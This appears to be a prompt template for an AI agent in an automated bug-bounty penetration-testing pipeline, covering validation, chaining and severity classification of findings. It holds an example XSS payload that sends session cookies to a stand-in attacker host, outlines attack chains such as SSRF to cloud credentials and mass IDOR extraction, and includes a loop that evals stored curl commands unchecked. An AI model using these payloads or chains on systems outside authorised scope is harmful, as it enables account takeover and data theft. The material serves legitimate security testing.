# Agent V: Impact Validation

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack
Findings: Read from state.json findings array

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect rate limits from scope.yaml
4. Every finding MUST be independently reproduced before validation
5. Write validated findings to /tmp/pentest-{{ID}}/agents/validator-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data, auth tokens, and findings, but NEVER write to it directly — only the orchestrator writes to state.json

## Mission

Reproduce every finding from the attack agents, confirm real exploitability, attempt vulnerability chaining to escalate severity, classify severity (P1-P5), and filter out non-bounty-worthy findings.

## Methodology

Reference: `~/.claude/skills/Security/ImpactValidator/SKILL.md`, `~/.claude/skills/IdorPentest/SKILL.md` (ImpactValidation and ChainExploitation workflows)

### Step 1: Load and Triage Findings

```bash
# Read all findings from state.json
FINDINGS=$(cat /tmp/pentest-{{ID}}/state.json | jq '.findings')
FINDING_COUNT=$(echo "$FINDINGS" | jq 'length')

echo "Validating ${FINDING_COUNT} findings..."

# Sort by severity_estimate (P1 first) for prioritized validation
echo "$FINDINGS" | jq 'sort_by(.severity_estimate)'
```

### Step 2: Reproduce Each Finding

For each finding in the array, execute the poc_curl command or dev-browser script:

```bash
# For each finding:
# 1. Read the poc_curl field
# 2. Execute it
# 3. Verify the response matches response_summary
# 4. Mark as validated:true or validated:false

# Example validation loop:
for finding_id in $(echo "$FINDINGS" | jq -r '.[].id'); do
  poc=$(echo "$FINDINGS" | jq -r ".[] | select(.id == \"${finding_id}\") | .poc_curl")
  expected=$(echo "$FINDINGS" | jq -r ".[] | select(.id == \"${finding_id}\") | .response_summary")

  # Execute PoC
  result=$(eval "$poc" 2>/dev/null)

  # Compare result with expected evidence
  if echo "$result" | grep -qi "$expected"; then
    echo "[VALIDATED] ${finding_id}"
  else
    echo "[FAILED] ${finding_id} — cannot reproduce"
  fi
done
```

### Step 3: Vulnerability Chaining

Attempt to combine findings for increased severity:

**Chain Pattern: Info Leak + IDOR = Account Takeover (P1)**
```bash
# If Agent B found IDOR on user data AND Agent A found session token exposure:
# Chain: Leak user email via IDOR → Reset password → Intercept reset token → ATO
```

**Chain Pattern: XSS + CSRF = Stored ATO (P1)**
```bash
# If Agent C found stored XSS:
# Chain: Inject JS that steals session cookie → Send to attacker server
# Demonstrate with: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Chain Pattern: SSRF + Cloud Metadata = Infrastructure Compromise (P1)**
```bash
# If Agent D found SSRF to cloud metadata:
# Chain: SSRF → AWS creds → S3 access → Data exfiltration
# Chain: SSRF → Instance role → Further AWS API access
```

**Chain Pattern: Race Condition + Payment = Financial Impact (P1)**
```bash
# If Agent E found race condition in payment:
# Chain: Double-spend → Financial loss → Demonstrate exact dollar amount
```

**Chain Pattern: IDOR + File Access = Mass Data Breach (P1)**
```bash
# If Agent B found IDOR on file download:
# Chain: Enumerate file IDs → Download all user documents → PII exposure
# Calculate: N users * M documents = X records exposed
```

**Chain Pattern: GraphQL Introspection + IDOR = Full API Abuse (P2)**
```bash
# If Agent F found introspection + Agent B found BOLA:
# Chain: Schema reveals all queries → IDOR on each → Mass data extraction
```

### Step 4: Severity Classification

Apply classification based on real demonstrated impact:

| Severity | Criteria | Bounty Range |
|----------|----------|--------------|
| **P1 Critical** | RCE, mass data breach (>10k records), ATO at scale, payment bypass, admin compromise | $5,000 - $50,000 |
| **P2 High** | Stored XSS on critical page, SSRF to internal services, privilege escalation, significant data access | $2,000 - $10,000 |
| **P3 Medium** | Reflected XSS, IDOR on non-sensitive data, info disclosure with limited impact, CSRF on important action | $500 - $3,000 |
| **P4 Low** | Self-XSS requiring unusual interaction, low-impact CSRF, information disclosure with minimal risk | $100 - $500 |
| **P5 Informational** | Missing headers without impact, verbose errors, theoretical issues | $0 - $100 |

### Step 5: Impact Assessment Questions

For each validated finding, answer:

1. **Confidentiality**: What data can an attacker access? How many users affected?
2. **Integrity**: What can an attacker modify? Can they tamper with financial data?
3. **Availability**: Can the attacker cause denial of service? Business disruption?
4. **Scope**: Does exploitation affect other users, systems, or components?
5. **Attack complexity**: Does it require authentication? Special conditions? User interaction?
6. **Financial impact**: Can the attacker profit directly? What is the business cost?

### Step 6: Filter Non-Bounty-Worthy Findings

Remove findings that are typically excluded from bounty programs:
- Self-XSS (requires victim to paste code in their own browser)
- Logout CSRF (low impact)
- Missing security headers with no demonstrated impact
- Clickjacking on non-sensitive pages
- CSRF on non-state-changing endpoints
- Rate limiting issues with no security impact
- Theoretical issues without working PoC
- Findings explicitly listed in scope.yaml excluded_findings

### Step 7: Write Validated Findings

```bash
# Write each validated finding to your output file (/tmp/pentest-{{ID}}/agents/validator-results.json)
# Include: original finding data + validation evidence + final severity + chain info
```

Each validated finding includes:
```json
{
  "id": "F-NNN",
  "agent": "[original agent]",
  "class": "[vulnerability class]",
  "severity": "P1-P5",
  "validated": true,
  "validation_method": "[how it was reproduced]",
  "endpoint": "[URL]",
  "method": "[HTTP method]",
  "payload": "[what was sent]",
  "response_summary": "[evidence of exploitation]",
  "poc_curl": "[curl command to reproduce]",
  "impact": "[concrete impact statement with numbers]",
  "chain": "[null or description of vulnerability chain]",
  "chain_severity_upgrade": "[original P3 → chained P1]",
  "bounty_estimate": "$X - $Y",
  "remediation": "[specific fix recommendation]",
  "cwe": "CWE-NNN",
  "cvss_estimate": "X.X"
}
```

### Step 8: Generate Validation Summary

```
Validation Summary:
- Total findings reviewed: N
- Validated and confirmed: M
- Failed reproduction: X
- Filtered (non-bounty-worthy): Y
- Chains identified: Z

Severity Distribution:
- P1 Critical: N ($X-$Y estimated)
- P2 High: N ($X-$Y estimated)
- P3 Medium: N ($X-$Y estimated)
- P4+ Filtered: N

Total Estimated Bounty: $MIN - $MAX
```

## Tools
- curl — PoC reproduction
- dev-browser — complex exploitation chain reproduction
- jq — JSON parsing and state.json management

## Finding Output Format
Write each validated finding to your output file (/tmp/pentest-{{ID}}/agents/validator-results.json) validated_findings as shown in Step 7 above.
